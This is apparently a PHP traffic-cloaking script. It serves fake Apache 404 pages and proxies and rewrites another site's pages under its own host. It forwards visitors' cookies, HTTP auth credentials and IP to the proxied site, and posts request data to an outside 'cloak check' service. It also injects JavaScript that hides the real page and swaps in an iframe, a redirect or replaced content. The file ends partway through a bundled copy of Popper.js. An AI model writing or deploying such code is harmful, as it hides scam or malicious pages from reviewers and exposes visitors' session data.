<?php 
    error_reporting(0); 
    
    
    $gContentType = "text/html; charset=utf-8";

    function getIp() {
        foreach (array('HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key) {
            if (array_key_exists($key, $_SERVER) === true)
            {
                foreach (explode(',', $_SERVER[$key]) as $ip)
                {
                    if (filter_var($ip, FILTER_VALIDATE_IP) !== false)
                    {
                        return $ip;
                    }
                }
            }
        }
    }

    function exitWithNotFound() {
        header_remove();
        header("HTTP/1.1 404 Not Found");
        $apacheVersion = "Apache/2.4.10 (Unix)";
        ob_clean();
        echo('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">');
        echo("<html><head>");
        echo("<title>404 Not Found</title>");
        echo("</head><body>");
        echo("<h1>Not Found</h1>");
        echo("<p>The requested URL ".htmlspecialchars($_SERVER['REQUEST_URI'])." was not found on this server.</p>"); 
        echo("<hr>");
        echo("<address>".$apacheVersion." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."</address>");
        echo("</body></html>");
        exit;
    }

    function exitWithError($message) {
        $apacheVersion = "Apache/2.4.10 (Unix)";
        ob_clean();
        echo('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">');
        echo("<html><head>");
        echo("<title></title>");
        echo("</head><body>");
        echo("<h1>Error</h1>");
        echo("<p>".$message."</p>"); 
        echo("<hr>");
        echo("<address>".$apacheVersion." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."</address>");
        echo("</body></html>");
        exit;
    }

    function setData($IP, $data) {
        try {
            $store = [
                $IP => [
                    'data' => $data,
                    'expires' => time() + 60
                ]
            ];
            $filename = "store.json";
            if(file_exists($filename)) {
                $storeJSON = file_get_contents($filename);
                $store = json_decode($storeJSON);
                if($store !== NULL) {
                    $store->{$IP} = [
                        'data' => $data,
                        'expires' => time() + 60
                    ];
                }
            } else {
                $fp = fopen($filename, "w");
                fclose($fp);
            }
            $store = json_encode($store);
            $fp = fopen($filename, "r+");
            if (flock($fp, LOCK_EX)) {
                ftruncate($fp, 0); 
                fwrite($fp, $store);
                fflush($fp);
                flock($fp, LOCK_UN);
            } else {
                fclose($fp);
                throw new Exception('Error flock required PHP 4, PHP 5, PHP 7 ');
            }
            fclose($fp);
        } catch (Exception $e) {
            $message = $e->getMessage();
            if(!$message) {
                $message = "Error setData, index.php не имеет необходив прав. Необходимы права 766";
            }
            exitWithError($message);
        }
    }

    function getData($IP) {
        try {
            $filename = "store.json";
            if(file_exists($filename)) {
                $storeJSON = file_get_contents($filename);
                $store = json_decode($storeJSON);
                if($store) {
                    $data = $store->{$IP};
                    if($data->expires > time()) {
                        return $data->data;
                    } 
                } 
            }
            return false;
        } catch (Exception $e) {
            $message = $e->getMessage();
            if(!$message) {
                $message = "Error getData, index.php не имеет необходив прав. Необходимы права 766";
            }
            exitWithError($message);
        }
    }
    // A helper function to check if one string starts with another substring.
    function starts_with($string, $query) {
        return substr($string, 0, strlen($query)) === $query;
    }
    function getContent($content_url, $isFollow) {
        
        // Initialize and configure our curl session
        $session = curl_init($content_url);

        // This implementation supports POST and GET only, add custom login here as needed
        $request_method = $_SERVER['REQUEST_METHOD'];
        if($request_method === 'POST') {
            curl_setopt($session, CURLOPT_POST, true);
            curl_setopt($session, CURLOPT_POSTFIELDS, file_get_contents("php://input"));
        } else {
            curl_setopt($session, CURLOPT_CUSTOMREQUEST, $request_method);
        }
        // HTTP headers
        
        $request_content_type = $GLOBALS['gContentType'];
        if(isset($_SERVER["CONTENT_TYPE"])) {
            $request_content_type = $_SERVER["CONTENT_TYPE"];
        } else if(isset($_SERVER["HTTP_CONTENT_TYPE"])) {
            $request_content_type = $_SERVER["HTTP_CONTENT_TYPE"];
        } else {
            $headers_list = headers_list();
            foreach ($headers_list as $key => $value) {
                $searchStr = 'Content-type: ';
                $posContentType = strpos($value, $searchStr);
                if($posContentType !== false) {
                    $request_content_type = substr($value, strlen($searchStr), strlen($value));
                }
            };
        }
        
        curl_setopt($session, CURLOPT_HTTPHEADER, array("Content-Type: $request_content_type", "X-Forwarded-For: ".getIp()));
        if (isset($_SERVER['PHP_AUTH_USER'])) {
            curl_setopt($session, CURLOPT_USERPWD, $_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']);
        }
        curl_setopt($session, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($session, CURLOPT_FOLLOWLOCATION, $isFollow);
        curl_setopt($session, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($session, CURLOPT_HEADER, true);
        // Here we pass our request cookies to curl's request
        $cookie_string = '';
        foreach ($_COOKIE as $key => $value) {
            $cookie_string .= "$key=$value;";
        };
        curl_setopt($session, CURLOPT_COOKIE, $cookie_string);
        // Finally, trigger the request
        $response = curl_exec($session);
        // Due to CURLOPT_HEADER=1 we will receive body and headers, so we need to split them
        $header_size = curl_getinfo($session, CURLINFO_HEADER_SIZE);
        $response_body = substr($response, $header_size);
        $response_httpcode = curl_getinfo($session, CURLINFO_HTTP_CODE);
        $response_content_type = curl_getinfo($session, CURLINFO_CONTENT_TYPE);
        $response_error = curl_error($session);
        curl_close($session);
        $GLOBALS['gContentType'] = $response_content_type;
        if($response_httpcode !== 404) {// This part copies all Set-Cookie headers from curl's response to this php response
            $header_text = substr($response, 0, strpos($response, "\r\n\r\n"));
            
            $isRedirect = '';
            foreach (explode("\r\n", $header_text) as $i => $line) {
                if (starts_with($line, "Set-Cookie") || starts_with($line, "WWW-Authenticate")) {
                    header($line,0);
                }
                if(starts_with($line, "Location")) {
                    $isRedirect = $line;
                }
            }
            header("Content-type: $response_content_type", 1);
            http_response_code($response_httpcode);
            if(strlen($isRedirect) > 0) {
                header($isRedirect,0);
                exit;
            }
            // Send the response output

            if($response_error) {
                return exitWithError($response_error);
            } else {
                return $response_body;
            }
        }
        return false;
    }

    function getElementByTag($domString, $tagName) {
        if(!$domString) {
            return false;
        }
        if(!$tagName) {
            return false;
        }
        
        $posTag = strpos($domString, '<'.$tagName);
        if($posTag !== false ) {
            $endTag = '</'.$tagName.'>';
            $posEndTag = strpos($domString, $endTag);
            if($posEndTag === false) {
                $posEndTagTypeOne = strpos($domString, '/>', $posTag);
                $posEndTagTypeTwo = strpos($domString, '>', $posTag);
                if($posEndTagTypeOne === false) {
                    $posEndTag = $posEndTagTypeTwo;
                    $endTag = '>';
                } else if($posEndTagTypeOne > $posEndTagTypeTwo) {
                    $posEndTag = $posEndTagTypeTwo;
                    $endTag = '>';
                } else {
                    $posEndTag = $posEndTagTypeOne;
                    $endTag = '/>';
                }
            }
            $posEndTag = $posEndTag + strlen($endTag);
            $tag = substr($domString, $posTag, $posEndTag-$posTag);
        } else {
            $tag = false;
        }
        return $tag;
    }

    function getAttribute($tagString, $atrName) {
        $typeQute = '"';
        $posQuote = strpos($tagString, $typeQute);
        if($posQuote === false) {
            $typeQute = "'";
            $posQuote = strpos($tagString, $typeQute);
        }
        $posQuote = $posQuote+1;
        $posEndQuote = strpos($tagString, $typeQute, $posQuote);
        $atrName = substr($tagString, $posQuote, $posEndQuote-$posQuote);
        return $atrName;
    }

    function getHtml($content) {;
        
        $contentType = $GLOBALS['gContentType'];
        
        $isHtml = preg_match('/'.preg_quote('text/html', '/').'/is', $contentType) === 1;
        
        if($isHtml) {
            return $content;
        }
        
        $isHtml = preg_match('/'.preg_quote('<!doctype.*?html', '/').'/is', $content) === 1;
        
        if($isHtml) {
            return $content;
        }
        $isHtml = preg_match('/^<html/i', $content) === 1;
        if($isHtml) {
            return $content;
        }
        return false;
    };

    function merge_paths($path1, $path2){
        $paths = func_get_args();
        $last_key = func_num_args() - 1;
        array_walk($paths, function(&$val, $key) use ($last_key) {
            switch ($key) {
                case 0:
                    $val = rtrim($val, '/ ');
                    break;
                case $last_key:
                    $val = ltrim($val, '/ ');
                    break;
                default:
                    $val = trim($val, '/ ');
                    break;
            }
        });
    
        $first = array_shift($paths);
        $last = array_pop($paths);
        $paths = array_filter($paths); // clean empty elements to prevent double slashes
        array_unshift($paths, $first);
        $paths[] = $last;
        return implode('/', $paths);
    }

    function getSubstr($str, $startStr, $endStr) {
        $pattern = '/'.preg_quote($startStr, '/').'(.*)'.preg_quote($endStr, '/').'/is';
        preg_match($pattern, $str, $matches, PREG_OFFSET_CAPTURE);
        $match = $matches[1];
        return $match[0];
    }

    function convertSubDomainToQuery($str, $domain) {
        
        //$patternSubDomen = '/[^\s^"'."^']*\.".preg_quote($domain, '/').'[^\s^"'."^']*".'/is';
        $patternSubDomen = '/(<\s*meta[^>]*)?(\/\/[^\s^"'."^']*?\.".preg_quote($domain, '/').'[^\s^"'."^']*)/is";
        $posSubDomain = 0;
        
        $convertedStr = str_replace("\u002F",'/', $str);
        
        $tempStr = $convertedStr;
        
        while (true) {
            preg_match($patternSubDomen, $tempStr, $matches, PREG_OFFSET_CAPTURE);
            $match = @$matches[2];
            $metaMatch = @$matches[1];
            if($match) {
                    $matchedUrl = $newMatchedUrl = $match[0];
                    $posMatch = $match[1];
                    $posEndMatch = $posMatch + strlen($matchedUrl);
                    
                    if($metaMatch[1]==-1) {
                        $subDomains = getSubstr($matchedUrl, '//', $domain);
                        $query = parse_url($matchedUrl, PHP_URL_QUERY);
                        
                        if($query) {
                            $newQuery = $query."&".'jaclosubdomains='.$subDomains;
                            $newMatchedUrl = str_replace($query, $newQuery, $matchedUrl);
                        } else {
                            $newQuery = '?jaclosubdomains='.$subDomains;
                            $newMatchedUrl = $matchedUrl.$newQuery;
                        }
                    }
                    
                    $newTempStr = substr_replace($tempStr, $newMatchedUrl,$posMatch, strlen($matchedUrl));
                    
                    $convertedStr = str_replace($tempStr, $newTempStr, $convertedStr);
                    
                    $tempStr = substr($tempStr,$posMatch + strlen($matchedUrl));
                
            } else {
                break;
            }
        }
        return $convertedStr;
    }
    
    function convertQueryToSubDomain($url) {
        $queryString = parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY);
        parse_str($queryString, $query);
        $subDomains = @$query['jaclosubdomains'];
        unset($query['jaclosubdomains']);
        $query = http_build_query($query);
        $result = parse_url($url, PHP_URL_SCHEME)."://".$subDomains.parse_url($url, PHP_URL_HOST).parse_url($url, PHP_URL_PATH);
        $origQuery = parse_url($url, PHP_URL_QUERY);
        if($query || $origQuery) {
            if($query) {
                $query = $origQuery."&".$query;
            } else {
                $query = $origQuery;
            }
            $result = $result.'?'.$query;
        }
        return $result;
    }

    function getPageWithProxy($pageUrl, $isFollow) {
        
        $query = parse_url($_SERVER['REQUEST_URI'], PHP_URL_QUERY);
        $pathUrl = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $base = parse_url($pageUrl, PHP_URL_SCHEME)."://".parse_url($pageUrl, PHP_URL_HOST);
        
        $isRequestPage = (strlen($pathUrl) === 1);

        if($isRequestPage) {
            $pathUrl = parse_url($pageUrl, PHP_URL_PATH);
            if ($query) {
                $query =  $query."&".parse_url($pageUrl, PHP_URL_QUERY);
                $pathUrl .= '?' . $query;
            } else {
                $query =  parse_url($pageUrl, PHP_URL_QUERY);
                if($query) {
                    $pathUrl .= '?' . $query;
                }
            }
            
            $proxyUrl = $base . $pathUrl;
        } else {
            if ($query) {
                $pathUrl .= '?' . $query;
            }
            $proxyUrl = $base . $pathUrl;
        }
        $proxyUrl = convertQueryToSubDomain($proxyUrl);
        
        $content = getContent($proxyUrl, $isFollow);
        
        $html = getHtml($content);
        if($html) {
            
            $commentPattern = '/'.preg_quote('<!--').'.*?'.preg_quote('-->').'/s';
            $html = preg_replace($commentPattern,'', $html);
            
            $pageHost = parse_url($pageUrl, PHP_URL_HOST);
            
            $head = getElementByTag($html,'head');
            $body = getElementByTag($html,'body');
            
            $origUrl = rtrim(parse_url($pageUrl, PHP_URL_HOST).parse_url($pageUrl, PHP_URL_PATH), '/');
            $currentUrl = rtrim($_SERVER['HTTP_HOST'], '/');
            $currentHost = 'http://'.$currentUrl;
            
            $url = $currentHost.$_SERVER['REQUEST_URI'];

            $patternCanonical = '/<link[^>]*rel[^>]*canonical[^>]*>/is';
            $patternOgUrl = '/<meta[^>]*property[^>]*og:url[^>]*>/is';
            $patternOrigUrl = '/'.preg_quote($origUrl,'/').'/is';
            $patternOrigHost = '/(http)?[^\s^"'."^']*?^\?".preg_quote($pageHost, '/').'/is';

            $convertedHead = convertSubDomainToQuery($head, $pageHost);
            $convertedBody = convertSubDomainToQuery($body, $pageHost);

            $convertedHead = preg_replace($patternCanonical, '<link rel="canonical" href="'.$url.'"/>', $convertedHead);
            $convertedHead = preg_replace($patternOgUrl, '<meta property="og:url" content="'.$url.'"/>', $convertedHead);
            $convertedHead = preg_replace($patternOrigHost, $currentHost, $convertedHead);
            $convertedHead = preg_replace($patternOrigUrl, $currentUrl, $convertedHead);

            if($convertedHead !== NULL) {
                $html = str_replace($head, $convertedHead, $html);
                $head = $convertedHead;
            }
            
            $convertedBody = preg_replace($patternOrigHost, $currentHost, $convertedBody);
            $convertedBody = preg_replace($patternOrigUrl, $currentUrl, $convertedBody);
            
            if($convertedBody !== NULL) {
                $html = str_replace($body, $convertedBody, $html);
                $body = $convertedBody;
            }
            $base = getElementByTag($head,'base');
            if($base !== false) {
                $hrefBase= '';
                $origHrefBase = getAttribute($base, 'href');
                $posDotHrefBase = strpos($origHrefBase, '.');
                if($posDotHrefBase === false && !$origHrefBase) {
                    $hrefBase = parse_url($pageUrl, PHP_URL_PATH);
                    $hrefBase = substr($hrefBase,0, strrpos($hrefBase,'/')+1);
                }
                if(strlen($hrefBase) > 0) {
                    $hrefBase = merge_paths($hrefBase,$origHrefBase);
                } else {
                    $hrefBase = $origHrefBase;
                }
                $html = str_replace($base, '<base href="'.$hrefBase.'">', $html);
            } else {
                $hrefBase = parse_url($pageUrl, PHP_URL_PATH);
                if(strlen($pathUrl) >1) {
                    $hrefBase = $pathUrl;
                }
                $hrefBase = substr($hrefBase,0, strrpos($hrefBase,'/')+1);
                $isBase = strlen($hrefBase) > 1;
                if($isBase) {
                    $posStartHead = strpos($head,">")+1;
                    $startHead = substr($head,0, $posStartHead);
                    $newStartHead = $startHead."\n\t".'<base href="'.$hrefBase.'">';
                    $newHead = str_replace($startHead, $newStartHead, $head);
                    $html = str_replace($head, $newHead, $html);
                }
            }
            return $html;
        }
        
        return $content;
    }

    function initCurl($payload, $retry=false) {
        if($retry) {
            $url = 'http://check2.dzhaweb.com/api/cloak/check';
        } else {
            $url = 'http://check.dzhaweb.com/api/cloak/check';
        }
        
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLINFO_HEADER_OUT, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json',
            'Content-Length: ' . strlen($payload))
        );
        return $ch;
    }
    
    function getIframeScript($link) {
        $scheme = parse_url($link, PHP_URL_SCHEME);
        $host = parse_url($link, PHP_URL_HOST);
        $path = parse_url($link, PHP_URL_PATH);
        $query = parse_url($link, PHP_URL_QUERY);
        $port = parse_url($link, PHP_URL_PORT);
        if($port) {
            $link = $scheme."://".$host.":".$port.$path;
        } else {
            $link = $scheme."://".$host.$path;
        }
        return 'var head = document.head;
var styleBody = document.createElement("style");
if(head) {
    head.appendChild(styleBody);
    styleBody.sheet.insertRule("body{ display: none !important;}");
}
document.addEventListener("DOMContentLoaded", function () {
    var body = document.body;
    if(body) {
        var search = document.location.search;
        var link = "'.$link.'";
        var query = "'.$query.'";

        if(search) {
            var searchArr = search.split("&");
            searchArr[0] = searchArr[0].slice(1);
            var querys = query.split("&");
            for(var s = 0; s < searchArr.length; s++) {
                var searchProp = searchArr[s].split("=")[0];
                for(var q = 0; q< querys.length; q++) {
                    var queryProp = querys[q].split("=")[0];
                    if(queryProp === searchProp) {
                        querys.splice(q,1);
                    }
                }
            }
            query = querys.join("&");
            if(query) {
                if(search[search.length-1] === "&") {
                    query = search + query;
                } else {
                    query = search + "&" + query;
                }
            } else {
                query = search;
            }
        }
        
        if(query) {
            if(query[0] === "?") {
                link = link + query;
            } else {
                link = link + "?" + query;
            }
        }
        var children = body.children;
        for (var i = 0; i < children.length; i++) {
            var child = children[i];
            if(child) {
                child.style.display = "none";
            }
        }
        var style = document.createElement("style");
        document.head.appendChild(style);
        style.sheet.insertRule("html,body,iframe{ height: 100% !important; margin: 0 !important;}");

        var iframe = document.createElement("iframe");
        iframe.setAttribute("src", link);
        iframe.setAttribute("frameborder", "0");
        iframe.style.width = "100%";
        iframe.style.height = "100%";
        body.appendChild(iframe);
        
        if(styleBody.parentNode) {
            styleBody.parentNode.removeChild(styleBody)
        }
    }
});';
    }
    
    function getRedirectScript($link) {
        $scheme = parse_url($link, PHP_URL_SCHEME);
        $host = parse_url($link, PHP_URL_HOST);
        $path = parse_url($link, PHP_URL_PATH);
        $query = parse_url($link, PHP_URL_QUERY);
        $port = parse_url($link, PHP_URL_PORT);
        if($port) {
            $link = $scheme."://".$host.":".$port.$path;
        } else {
            $link = $scheme."://".$host.$path;
        }
        return 'var search = document.location.search;
var link = "'.$link.'";
var query = "'.$query.'";

if(search) {
    var searchArr = search.split("&");
    searchArr[0] = searchArr[0].slice(1);
    var querys = query.split("&");
    for(var s = 0; s < searchArr.length; s++) {
        var searchProp = searchArr[s].split("=")[0];
        for(var q = 0; q< querys.length; q++) {
            var queryProp = querys[q].split("=")[0];
            if(queryProp === searchProp) {
                querys.splice(q,1);
            }
        }
    }
    query = querys.join("&");
    if(query) {
        if(search[search.length-1] === "&") {
            query = search + query;
        } else {
            query = search + "&" + query;
        }
    } else {
        query = search;
    }
}

if(query) {
    if(query[0] === "?") {
        link = link + query;
    } else {
        link = link + "?" + query;
    }
}
document.location.href = link;';
    }
    
    function getReplaceScript($link) {
        $scheme = parse_url($link, PHP_URL_SCHEME);
        $host = parse_url($link, PHP_URL_HOST);
        $path = parse_url($link, PHP_URL_PATH);
        $query = parse_url($link, PHP_URL_QUERY);
        $port = parse_url($link, PHP_URL_PORT);
        if($port) {
            $link = $scheme."://".$host.":".$port.$path;
        } else {
            $link = $scheme."://".$host.$path;
        }
        return 'var head = document.head;
var styleBody = document.createElement("style");
if(head) {
    head.appendChild(styleBody);
    styleBody.sheet.insertRule("body{ display: none !important;}");
}
var search = document.location.search;
var link = "'.$link.'";
var query = "'.$query.'";
if(search) {
    var searchArr = search.split("&");
    searchArr[0] = searchArr[0].slice(1);
    var querys = query.split("&");
    for(var s = 0; s < searchArr.length; s++) {
        var searchProp = searchArr[s].split("=")[0];
        for(var q = 0; q< querys.length; q++) {
            var queryProp = querys[q].split("=")[0];
            if(queryProp === searchProp) {
                querys.splice(q,1);
            }
        }
    }
    query = querys.join("&");
    if(search[search.length-1] === "&") {
        query = search + query;
    } else {
        query = search + "&" + query;
    }
}

if(query) {
    if(query[0] === "?") {
        link = link + query;
    } else {
        link = link + "?" + query;
    }
}
var xhr = new XMLHttpRequest();
xhr.open( "GET", link);
xhr.send();
xhr.onload = function() {
    if (xhr.status === 200) {
        document.open();
        document.write(xhr.responseText);
        document.close();
    } 
};';
    }
    function getJsScript() {
        return '/**
        * @popperjs/core v2.3.3 - MIT License
        */
       
       "use strict";!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?t(exports):"function"==typeof define&&define.amd?define(["exports"],t):t((e=e||self).Popper={})}(this,(function(e){function t(e){return{width:(e=e.getBoundingClientRect()).width,height:e.height,top:e.top,right:e.right,bottom:e.bottom,left:e.left,x:e.left,y:e.top}}function r(e){return"[object Window]"!==e.toString()?(e=e.ownerDocument)?e.defaultView:window:e}function n(e){return{scrollLeft:(e=r(e)).pageXOffset,scrollTop:e.pageYOffset}}function o(e){return e instanceof r(e).Element||e instanceof Element}function i(e){return e instanceof r(e).HTMLElement||e instanceof HTMLElement}function a(e){return e?(e.nodeName||"").toLowerCase():null}function s(e){return(o(e)?e.ownerDocument:e.document).documentElement}function f(e){return t(s(e)).left+n(e).scrollLeft}function p(e,o,p){void 0===p&&(p=!1),e=t(e);var c={scrollLeft:0,scrollTop:0},u={x:0,y:0};return p||("body"!==a(o)&&(c=o!==r(o)&&i(o)?{scrollLeft:o.scrollLeft,scrollTop:o.scrollTop}:n(o)),i(o)?((u=t(o)).x+=o.clientLeft,u.y+=o.clientTop):(o=s(o))&&(u.x=f(o))),{x:e.left+c.scrollLeft-u.x,y:e.top+c.scrollTop-u.y,width:e.width,height:e.height}}function c(e){return{x:e.offsetLeft,y:e.offsetTop,width:e.offsetWidth,height:e.offsetHeight}}function u(e){return"html"===a(e)?e:e.assignedSlot||e.parentNode||e.host||s(e)}function l(e){return r(e).getComputedStyle(e)}function d(e,t){void 0===t&&(t=[]);var n=function e(t){if(0<=["html","body","#document"].indexOf(a(t)))return t.ownerDocument.body;if(i(t)){var r=l(t);if(/auto|scroll|overlay|hidden/.test(r.overflow+r.overflowY+r.overflowX))return t}return e(u(t))}(e);e="body"===a(n);var o=r(n);return n=e?[o].concat(o.visualViewport||[]):n,t=t.concat(n),e?t:t.concat(d(u(n)))}function m(e){return i(e)&&"fixed"!==l(e).position?e.offsetParent:null}function h(e){var t=r(e);for(e=m(e);e&&0<=["table","td","th"].indexOf(a(e));)e=m(e);return e&&"body"===a(e)&&"static"===l(e).position?t:e||t}function v(e){var t=new Map,r=new Set,n=[];return e.forEach((function(e){t.set(e.name,e)})),e.forEach((function(e){r.has(e.name)||function e(o){r.add(o.name),[].concat(o.requires||[],o.requiresIfExists||[]).forEach((function(n){r.has(n)||(n=t.get(n))&&e(n)})),n.push(o)}(e)})),n}function g(e){var t;return function(){return t||(t=new Promise((function(r){Promise.resolve().then((function(){t=void 0,r(e())}))}))),t}}function b(e){return e.split("-")[0]}function y(){for(var e=arguments.length,t=Array(e),r=0;r<e;r++)t[r]=arguments[r];return!t.some((function(e){return!(e&&"function"==typeof e.getBoundingClientRect)}))}function w(e){void 0===e&&(e={});var t=e.defaultModifiers,r=void 0===t?[]:t,n=void 0===(e=e.defaultOptions)?F:e;return function(e,t,i){function a(){f.forEach((function(e){return e()})),f=[]}void 0===i&&(i=n);var s={placement:"bottom",orderedModifiers:[],options:Object.assign({},F,{},n),modifiersData:{},elements:{reference:e,popper:t},attributes:{},styles:{}},f=[],u=!1,l={state:s,setOptions:function(i){return a(),s.options=Object.assign({},n,{},s.options,{},i),s.scrollParents={reference:o(e)?d(e):e.contextElement?d(e.contextElement):[],popper:d(t)},i=function(e){var t=v(e);return C.reduce((function(e,r){return e.concat(t.filter((function(e){return e.phase===r})))}),[])}(function(e){var t=e.reduce((function(e,t){var r=e[t.name];return e[t.name]=r?Object.assign({},r,{},t,{options:Object.assign({},r.options,{},t.options),data:Object.assign({},r.data,{},t.data)}):t,e}),{});return Object.keys(t).map((function(e){return t[e]}))}([].concat(r,s.options.modifiers))),s.orderedModifiers=i.filter((function(e){return e.enabled})),s.orderedModifiers.forEach((function(e){var t=e.name,r=e.options;r=void 0===r?{}:r,"function"==typeof(e=e.effect)&&(t=e({state:s,name:t,instance:l,options:r}),f.push(t||function(){}))})),l.update()},forceUpdate:function(){if(!u){var e=s.elements,t=e.reference;if(y(t,e=e.popper))for(s.rects={reference:p(t,h(e),"fixed"===s.options.strategy),popper:c(e)},s.reset=!1,s.placement=s.options.placement,s.orderedModifiers.forEach((function(e){return s.modifiersData[e.name]=Object.assign({},e.data)})),t=0;t<s.orderedModifiers.length;t++)if(!0===s.reset)s.reset=!1,t=-1;else{var r=s.orderedModifiers[t];e=r.fn;var n=r.options;n=void 0===n?{}:n,r=r.name,"function"==typeof e&&(s=e({state:s,options:n,name:r,instance:l})||s)}}},update:g((function(){return new Promise((function(e){l.forceUpdate(),e(s)}))})),destroy:function(){a(),u=!0}};return y(e,t)?(l.setOptions(i).then((function(e){!u&&i.onFirstUpdate&&i.onFirstUpdate(e)})),l):l}}function x(e){return 0<=["top","bottom"].indexOf(e)?"x":"y"}function O(e){var t=e.reference,r=e.element,n=(e=e.placement)?b(e):null;e=e?e.split("-")[1]:null;var o=t.x+t.width/2-r.width/2,i=t.y+t.height/2-r.height/2;switch(n){case"top":o={x:o,y:t.y-r.height};break;case"bottom":o={x:o,y:t.y+t.height};break;case"right":o={x:t.x+t.width,y:i};break;case"left":o={x:t.x-r.width,y:i};break;default:o={x:t.x,y:t.y}}if(null!=(n=n?x(n):null))switch(i="y"===n?"height":"width",e){case"start":o[n]=Math.floor(o[n])-Math.floor(t[i]/2-r[i]/2);break;case"end":o[n]=Math.floor(o[n])+Math.ceil(t[i]/2-r[i]/2)}return o}function M(e){var t,n=e.popper,o=e.popperRect,i=e.placement,a=e.offsets,f=e.position,p=e.gpuAcceleration,c=e.adaptive,u=window.devicePixelRatio||1;e=Math.round(a.x*u)/u||0,u=Math.round(a.y*u)/u||0;var l=a.hasOwnProperty("x");a=a.hasOwnProperty("y");var d,m="left",v="top",g=window;if(c){var b=h(n);b===r(n)&&(b=s(n)),"top"===i&&(v="bottom",u-=b.clientHeight-o.height,u*=p?1:-1),"left"===i&&(m="right",e-=b.clientWidth-o.width,e*=p?1:-1)}return n=Object.assign({position:f},c&&V),p?Object.assign({},n,((d={})[v]=a?"0":"",d[m]=l?"0":"",d.transform=2>(g.devicePixelRatio||1)?"translate("+e+"px, "+u+"px)":"translate3d("+e+"px, "+u+"px, 0)",d)):Object.assign({},n,((t={})[v]=a?u+"px":"",t[m]=l?e+"px":"",t.transform="",t))}function j(e){return e.replace(/left|right|bottom|top/g,(function(e){return I[e]}))}function E(e){return e.replace(/start|end/g,(function(e){return _[e]}))}function D(e,t){var r=!(!t.getRootNode||!t.getRootNode().host);if(e.contains(t))return!0;if(r)do{if(t&&e.isSameNode(t))return!0;t=t.parentNode||t.host}while(t);return!1}function P(e){return Object.assign({},e,{left:e.x,top:e.y,right:e.x+e.width,bottom:e.y+e.height})}function L(e,o){if("viewport"===o){var a=r(e);e=a.visualViewport,o=a.innerWidth,a=a.innerHeight,e&&/iPhone|iPod|iPad/.test(navigator.platform)&&(o=e.width,a=e.height),e=P({width:o,height:a,x:0,y:0})}else i(o)?e=t(o):(e=r(a=s(e)),o=n(a),(a=p(s(a),e)).height=Math.max(a.height,e.innerHeight),a.width=Math.max(a.width,e.innerWidth),a.x=-o.scrollLeft,a.y=-o.scrollTop,e=P(a));return e}function k(e,t,n){return t="clippingParents"===t?function(e){var t=d(e),r=0<=["absolute","fixed"].indexOf(l(e).position)&&i(e)?h(e):e;return o(r)?t.filter((function(e){return o(e)&&D(e,r)})):[]}(e):[].concat(t),(n=(n=[].concat(t,[n])).reduce((function(t,n){var o=L(e,n),p=r(n=i(n)?n:s(e)),c=i(n)?l(n):{};parseFloat(c.borderTopWidth);var u=parseFloat(c.borderRightWidth)||0,d=parseFloat(c.borderBottomWidth)||0,m=parseFloat(c.borderLeftWidth)||0;c="html"===a(n);var h=f(n),v=n.clientWidth+u,g=n.clientHeight+d;return c&&50<p.innerHeight-n.clientHeight&&(g=p.innerHeight-d),d=c?0:n.clientTop,u=n.clientLeft>m?u:c?p.innerWidth-v-h:n.offsetWidth-v,p=c?p.innerHeight-g:n.offsetHeight-g,n=c?h:n.clientLeft,t.top=Math.max(o.top+d,t.top),t.right=Math.min(o.right-u,t.right),t.bottom=Math.min(o.bottom-p,t.bottom),t.left=Math.max(o.left+n,t.left),t}),L(e,n[0]))).width=n.right-n.left,n.height=n.bottom-n.top,n.x=n.left,n.y=n.top,n}function B(e){return Object.assign({},{top:0,right:0,bottom:0,left:0},{},e)}function W(e,t){return t.reduce((function(t,r){return t[r]=e,t}),{})}function H(e,r){void 0===r&&(r={});var n=r;r=void 0===(r=n.placement)?e.placement:r;var i=n.boundary,a=void 0===i?"clippingParents":i,f=void 0===(i=n.rootBoundary)?"viewport":i;i=void 0===(i=n.elementContext)?"popper":i;var p=n.altBoundary,c=void 0!==p&&p;n=B("number"!=typeof(n=void 0===(n=n.padding)?0:n)?n:W(n,R));var u=e.elements.reference;p=e.rects.popper,a=k(o(c=e.elements[c?"popper"===i?"reference":"popper":i])?c:c.contextElement||s(e.elements.popper),a,f),c=O({reference:f=t(u),element:p,strategy:"absolute",placement:r}),p=P(Object.assign({},p,{},c)),f="popper"===i?p:f;var l={top:a.top-f.top+n.top,bottom:f.bottom-a.bottom+n.bottom,left:a.left-f.left+n.left,right:f.right-a.right+n.right};if(e=e.modifiersData.offset,"popper"===i&&e){var d=e[r];Object.keys(l).forEach((function(e){var t=0<=["right","bottom"].indexOf(e)?1:-1,r=0<=["top","bottom"].indexOf(e)?"y":"x";l[e]+=d[r]*t}))}return l}function T(e,t,r){return void 0===r&&(r={x:0,y:0}),{top:e.top-t.height-r.y,right:e.right-t.width+r.x,bottom:e.bottom-t.height+r.y,left:e.left-t.width-r.x}}function A(e){return["top","right","bottom","left"].some((function(t){return 0<=e[t]}))}var R=["top","bottom","right","left"],q=R.reduce((function(e,t){return e.concat([t+"-start",t+"-end"])}),[]),S=[].concat(R,["auto"]).reduce((function(e,t){return e.concat([t,t+"-start",t+"-end"])}),[]),C="beforeRead read afterRead beforeMain main afterMain beforeWrite write afterWrite".split(" 